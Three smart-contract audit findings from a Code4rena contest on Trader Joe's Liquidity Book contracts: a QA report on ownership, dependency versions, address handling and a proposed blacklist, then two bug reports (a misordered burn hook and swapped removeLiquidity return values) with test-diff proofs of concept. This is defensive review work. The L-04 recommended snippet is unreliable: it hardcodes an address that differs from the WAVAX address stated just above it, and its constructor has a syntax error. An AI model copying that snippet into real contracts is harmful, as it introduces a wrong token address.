**Context:** [PendingOwnable.sol#L84](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L84)  **Description:** Typically, the contracts owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.  The Trader JoesOwnableused inthis projectcontract implementsrenounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.   `onlyOwner` functions; ```js 14 results - 2 files  src/LBFactory.sol:   220:     function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {   322:     ) external override onlyOwner {   355:     ) external override onlyOwner {   401:     function removePreset(uint16 _binStep) external override onlyOwner {   439:     ) external override onlyOwner {   473:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   479:     function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {   490:     function setFactoryLockedState(bool _locked) external override onlyOwner {   498:     function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   507:     function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   525:     function forceDecay(ILBPair _LBPair) external override onlyOwner {  src/libraries/PendingOwnable.sol:   59:     function setPendingOwner(address pendingOwner_) public override onlyOwner {   68:     function revokePendingOwner() public override onlyOwner {   84:     function renounceOwnership() public override onlyOwner {  ```  **Recommendation:** We recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.  ### [L-03] Use a more recent version of OpenZeppelin dependencies  **Context:** All contracts  **Description:** For security, it is best practice to use the latest OZ version.  [package.json#L4](https://github.com/code-423n4/2022-10-traderjoe/blob/main/lib/openzeppelin-contracts/package.json#L4)  ```js "name": "openzeppelin-solidity",   "description": "Secure Smart Contract library for Solidity",   "version": "4.6.0", ```  For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of OZ is used `(4.6.0)`, newer version can be used `(4.7.3)`   https://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.3   ### [L-04] WAWAX address definition can be use directly  **Context:** [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Wawax is a wrap avax contract with a specific address in the Avalanche network, giving the option to define it may cause false recognition, it is healthier to define it directly.  Advantages of defining a specific contract directly: - It saves gas  - Prevents incorrect argument definition  - Prevents execution on a different chain and re-signature issues  WAWAX Address : 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7  ```js constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,         IWAVAX _wavax     ) {         factory = _factory;         oldFactory = _oldFactory;         wavax = _wavax;     } ```  **Recommendation:** ```js address private constant wavax = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;  constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,      ) {         factory = _factory;         oldFactory = _oldFactory;     } ```   ### [L-05] 2 step changes for privileged contract addresses  **Context:** https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L468   **Description:** Some contracts in the project have setters for privileged addresses that control the contract logic, such as the keeper.It would be best to do a two step change for those addresses.  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured  ``` src/LBFactory.sol:   530:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   531          _setFeeRecipient(_feeRecipient); ```  **Recommendation:**  ```js ///  _feeRecipient will only be changed if the new _feeRecipient accepts it. It will be pending till then. function setFeeRecipient(address _feeRecipient) external override onlyOwner {     pendingFeeRecipient = _feeRecipient; }  function acceptFeeRecipient() public {     require(msg.sender == pendingFeeRecipient, "INVALID_ADDRESS");     _setFeeRecipient(pendingFeeRecipient); } ```   ### [S-01] Add to _blacklist function_  **Description:** Cryptocurrency mixing service, Tornado Cash, has been blacklisted in the OFAC. A lot of blockchain companies, token projects, NFT Projects have ```blacklisted``` all Ethereum addresses owned by Tornado Cash listed in the US Treasury Department's sanction against the protocol. https://home.treasury.gov/policy-issues/financial-sanctions/recent-actions/20220808  Some of these Projects;  - USDC   - Aave   - Uniswap  - Balancer  - Infura  - Alchemy   - Opensea  - dYdX   For this reason, every project in the Avalanche network must have a blacklist function, this is a good method to avoid legal problems in the future, apart from the current need.  Transactions from the project by an account funded by Tonadocash or banned by OFAC can lead to legal problems.Especially American citizens may want to get addresses to the blacklist legally, this is not an obligation  If you think that such legal prohibitions should be made directly by validators, this may not be possible: https://www.paradigm.xyz/2022/09/base-layer-neutrality  ```The ban on Tornado Cash makes little sense, because in the end, no one can prevent people from using other mixer smart contracts, or forking the existing ones. It neither hinders cybercrime, nor privacy.```  Here is the most beautiful and close to the project example; Manifold  Manifold Contract https://etherscan.io/address/0xe4e4003afe3765aca8149a82fc064c0b125b9e5a#code  ```js      modifier nonBlacklistRequired(address extension) {          require(!_blacklistedExtensions.contains(extension), "Extension blacklisted");          _;      } ``` Recommended Mitigation Steps add to Blacklist function and modifier.   ### [S-02] Generate perfect code headers every time  **Description:** I recommend using header for Solidity code layout and readability  https://github.com/transmissions11/headers  ```js /*//////////////////////////////////////////////////////////////                            TESTING 123 //////////////////////////////////////////////////////////////*/ ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237   # Vulnerability details  ## Impact In `LBToken._burn`, the `_beforeTokenTransfer` hook is called with `from = address(0)` and `to = _account`: ```solidity _beforeTokenTransfer(address(0), _account, _id, _amount); ``` Through a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. `_burn` is always called with `_account = address(this)`, which means that `LBPair._beforeTokenTransfer` is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.  ## Proof Of Concept Let's say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be: ```solidity function _beforeTokenTransfer(         address _from,         address _to,         uint256 _id,         uint256 _amount     ) internal override(LBToken) {  if (_from == address(0)) {   // Mint Logic  } else if (_to == address(0)) {   // Burn Logic  } } ``` Such an extension would break, which could lead to loss of funds or a bricked system.  ## Recommended Mitigation Steps Call the hook correctly: ```solidity _beforeTokenTransfer(_account, address(0), _id, _amount); ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291   # Vulnerability details  ## Impact `LBRouter.removeLiquidity` reorders tokens when the user did not pass them in the pair order (ascending order): ```solidity if (_tokenX != _LBPair.tokenX()) {             (_tokenX, _tokenY) = (_tokenY, _tokenX);             (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin); } ``` However, when returning `amountX` and `amountY`, it is ignored if the order was changed: ```solidity (amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to); ``` Therefore, when the order of the tokens is swapped by the function, the return value `amountX` ("Amount of token X returned") in reality is the amount of the user-provided token Y that is returned and vice versa.  Because this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is: ``` (uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...); contractBalanceA += amountAReceived; contractBalanceB += amountBReceived; ``` This snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.  ## Proof Of Concept First consider the following diff, which shows a scenario when `LBRouter` does not switch `tokenX` and `tokenY`, resulting in correct return values: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token6D,              token18D,              DEFAULT_BIN_STEP, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountFirstRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountSecondRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test passes (as it should). Now, consider the following diff, where `LBRouter` switches `tokenX` and `tokenY`: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( -            token6D, +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token18D, +            token6D,              DEFAULT_BIN_STEP, -            totalXbalance,              totalYBalance, +            totalXbalance,              ids,              amounts,              DEV, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountSecondRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountFirstRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.  ## Recommended Mitigation Steps Add the following statement in the end: ```solidity if (_tokenX != _LBPair.tokenX()) {  return (amountY, amountX); } ```
